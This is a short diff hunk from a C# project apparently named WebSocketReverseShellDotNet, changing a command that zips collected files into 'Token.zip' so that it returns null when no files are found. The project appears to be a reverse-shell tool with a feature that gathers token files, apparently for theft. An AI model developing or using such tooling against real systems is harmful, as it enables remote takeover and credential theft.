@@ -58,8 +58,14 @@ namespace WebSocketReverseShellDotNet.service.commands
                 }
 
             }
+            if (listOfFilesToZip.Count == 0)
+            {
+                return null;
+            }else 
+            {
+                return OSUtil.ZipFiles(listOfFilesToZip, destDir, "Token.zip");
+            }
             
-            return OSUtil.ZipFiles(listOfFilesToZip, destDir, "Token.zip");
         }
 
     }
